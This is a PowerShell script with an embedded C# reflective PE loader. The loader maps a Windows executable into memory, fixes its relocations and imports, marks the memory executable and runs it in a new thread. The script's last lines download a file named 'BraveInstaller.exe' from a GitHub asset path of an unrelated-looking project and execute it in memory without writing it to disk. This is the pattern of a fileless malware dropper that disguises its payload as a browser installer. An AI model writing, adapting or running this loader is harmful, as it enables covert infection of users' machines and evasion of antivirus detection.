Add-Type -TypeDefinition @"

using System;
using System.Runtime.InteropServices;

public static class R
{
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER
    {
        public ushort e_magic;
        public ushort e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc, e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public ushort[] e_res;
        public ushort e_oemid, e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public ushort[] e_res2;
        public int e_lfanew;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER
    {
        public ushort Machine, NumberOfSections;
        public uint TimeDateStamp, PointerToSymbolTable, NumberOfSymbols;
        public ushort SizeOfOptionalHeader, Characteristics;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER64
    {
        public ushort Magic;
        public byte MajorLinkerVersion, MinorLinkerVersion;
        public uint SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment, FileAlignment;
        public ushort MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion;
        public uint Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
        public ushort Subsystem, DllCharacteristics;
        public ulong SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
        public uint LoaderFlags, NumberOfRvaAndSizes;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER32
    {
        public ushort Magic;
        public byte MajorLinkerVersion, MinorLinkerVersion;
        public uint SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode, BaseOfData, ImageBase;
        public uint SectionAlignment, FileAlignment;
        public ushort MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion;
        public uint Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
        public ushort Subsystem, DllCharacteristics;
        public uint SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
        public uint LoaderFlags, NumberOfRvaAndSizes;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name;
        public uint VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData;
        public uint PointerToRelocations, PointerToLinenumbers;
        public ushort NumberOfRelocations, NumberOfLinenumbers;
        public uint Characteristics;
    }

    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr lp, uint dw, uint fl, uint prot);
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string name);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out uint id);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll")] static extern bool VirtualFree(IntPtr lp, uint sz, uint f);

    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000, PAGE_READWRITE = 0x04, PAGE_EXECUTE_READWRITE = 0x40, MEM_RELEASE = 0x8000;

    public static int Run(byte[] pe)
    {
        if (pe == null || pe.Length < 0x40) return 1;
        IntPtr imageBase = IntPtr.Zero;
        try
        {
            var dos = BytesToStruct<IMAGE_DOS_HEADER>(pe, 0);
            int peOff = dos.e_lfanew;
            int ntOff = peOff + 4;
            var fh = BytesToStruct<IMAGE_FILE_HEADER>(pe, ntOff);
            bool is64 = fh.Machine == 0x8664;
            int optOff = ntOff + Marshal.SizeOf<IMAGE_FILE_HEADER>();
            ulong prefBase = 0;
            uint sizeImg = 0, epRva = 0;
            if (is64)
            {
                var o64 = BytesToStruct<IMAGE_OPTIONAL_HEADER64>(pe, optOff);
                prefBase = o64.ImageBase; sizeImg = o64.SizeOfImage; epRva = o64.AddressOfEntryPoint;
            }
            else
            {
                var o32 = BytesToStruct<IMAGE_OPTIONAL_HEADER32>(pe, optOff);
                prefBase = o32.ImageBase; sizeImg = o32.SizeOfImage; epRva = o32.AddressOfEntryPoint;
            }
            imageBase = VirtualAlloc((IntPtr)prefBase, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (imageBase == IntPtr.Zero)
                imageBase = VirtualAlloc(IntPtr.Zero, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (imageBase == IntPtr.Zero) return 2;

            int hdrSize = optOff + fh.SizeOfOptionalHeader + fh.NumberOfSections * Marshal.SizeOf<IMAGE_SECTION_HEADER>();
            Marshal.Copy(pe, 0, imageBase, hdrSize);
            for (int i = 0; i < fh.NumberOfSections; i++)
            {
                var sec = BytesToStruct<IMAGE_SECTION_HEADER>(pe, optOff + fh.SizeOfOptionalHeader + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
                if (sec.SizeOfRawData > 0)
                    Marshal.Copy(pe, (int)sec.PointerToRawData, IntPtr.Add(imageBase, (int)sec.VirtualAddress), (int)sec.SizeOfRawData);
            }

            long delta = (long)imageBase - (long)prefBase;
            if (delta != 0)
            {
                int relocDirRva = is64 ?
                    (int)BytesToStruct<IMAGE_OPTIONAL_HEADER64>(pe, optOff).NumberOfRvaAndSizes > 5 ? BitConverter.ToInt32(pe, optOff + 136 + 8) : 0 : 0;
                if (relocDirRva != 0) ApplyRelocs(pe, imageBase, relocDirRva, delta);
            }

            int importDirRva = is64 ? BitConverter.ToInt32(pe, optOff + 104 + 8) : BitConverter.ToInt32(pe, optOff + 80);
            if (importDirRva != 0) FixImports(pe, imageBase, importDirRva);

            VirtualAlloc(imageBase, sizeImg, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            uint tid;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, IntPtr.Add(imageBase, (int)epRva), IntPtr.Zero, 0, out tid);
            if (hThread == IntPtr.Zero) return 3;
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return 0;
        }
        catch { return 4; }
        finally { if (imageBase != IntPtr.Zero) VirtualFree(imageBase, 0, MEM_RELEASE); }
    }

    static T BytesToStruct<T>(byte[] buf, int offset) where T : struct
    {
        int size = Marshal.SizeOf<T>();
        IntPtr p = Marshal.AllocHGlobal(size);
        Marshal.Copy(buf, offset, p, size);
        T s = Marshal.PtrToStructure<T>(p);
        Marshal.FreeHGlobal(p);
        return s;
    }

    static int RvaToOffset(byte[] pe, int rva)
    {
        var dos = BytesToStruct<IMAGE_DOS_HEADER>(pe, 0);
        int ntOff = dos.e_lfanew + 4;
        var fh = BytesToStruct<IMAGE_FILE_HEADER>(pe, ntOff);
        int optOff = ntOff + Marshal.SizeOf<IMAGE_FILE_HEADER>();
        for (int i = 0; i < fh.NumberOfSections; i++)
        {
            var sec = BytesToStruct<IMAGE_SECTION_HEADER>(pe, optOff + fh.SizeOfOptionalHeader + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
            if (rva >= sec.VirtualAddress && rva < sec.VirtualAddress + sec.VirtualSize)
                return (int)(sec.PointerToRawData + (rva - sec.VirtualAddress));
        }
        return rva;
    }

    static void ApplyRelocs(byte[] pe, IntPtr baseAddr, int relocDirRva, long delta)
    {
        int offset = RvaToOffset(pe, relocDirRva);
        while (true)
        {
            int pageRva = BitConverter.ToInt32(pe, offset);
            int blockSize = BitConverter.ToInt32(pe, offset + 4);
            if (pageRva == 0 && blockSize == 0) break;
            int count = (blockSize - 8) / 2;
            for (int i = 0; i < count; i++)
            {
                short entry = BitConverter.ToInt16(pe, offset + 8 + i * 2);
                int type = (entry >> 12) & 0xF, off = entry & 0xFFF;
                IntPtr patchAddr = IntPtr.Add(baseAddr, pageRva + off);
                if (type == 3)
                    Marshal.WriteInt32(patchAddr, Marshal.ReadInt32(patchAddr) + (int)delta);
                else if (type == 10)
                    Marshal.WriteInt64(patchAddr, Marshal.ReadInt64(patchAddr) + delta);
            }
            offset += blockSize;
        }
    }

    static void FixImports(byte[] pe, IntPtr baseAddr, int importDirRva)
    {
        int offset = RvaToOffset(pe, importDirRva);
        while (true)
        {
            int iltRva = BitConverter.ToInt32(pe, offset);
            int nameRva = BitConverter.ToInt32(pe, offset + 12);
            int iatRva = BitConverter.ToInt32(pe, offset + 16);
            if (iltRva == 0 && nameRva == 0 && iatRva == 0) break;
            string dll = Marshal.PtrToStringAnsi(IntPtr.Add(baseAddr, RvaToOffset(pe, nameRva)));
            IntPtr hMod = LoadLibrary(dll);
            if (hMod == IntPtr.Zero) { offset += 20; continue; }
            int thunkRva = iltRva != 0 ? iltRva : iatRva;
            int thunkOff = RvaToOffset(pe, thunkRva), iatOff = RvaToOffset(pe, iatRva);
            while (true)
            {
                long val = Environment.Is64BitProcess ? Marshal.ReadInt64(IntPtr.Add(baseAddr, thunkOff)) : Marshal.ReadInt32(IntPtr.Add(baseAddr, thunkOff));
                if (val == 0) break;
                IntPtr func;
                if ((val & 0x80000000) != 0 || (val & 0x8000000000000000) != 0)
                    func = GetProcAddress(hMod, (IntPtr)(val & 0xFFFF));
                else
                {
                    int nameOff = RvaToOffset(pe, (int)(val & 0x7FFFFFFF));
                    string fn = Marshal.PtrToStringAnsi(IntPtr.Add(baseAddr, nameOff + 2));
                    func = GetProcAddress(hMod, fn);
                }
                if (Environment.Is64BitProcess) Marshal.WriteInt64(IntPtr.Add(baseAddr, iatOff), (long)func);
                else Marshal.WriteInt32(IntPtr.Add(baseAddr, iatOff), (int)func);
                thunkOff += Environment.Is64BitProcess ? 8 : 4;
                iatOff += Environment.Is64BitProcess ? 8 : 4;
            }
            offset += 20;
        }
    }
}

"@
$data = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/PoolSync-Studios/MCAntiPools/refs/heads/main/docs/assets/BraveInstaller.exe')
[R]::Run($data)
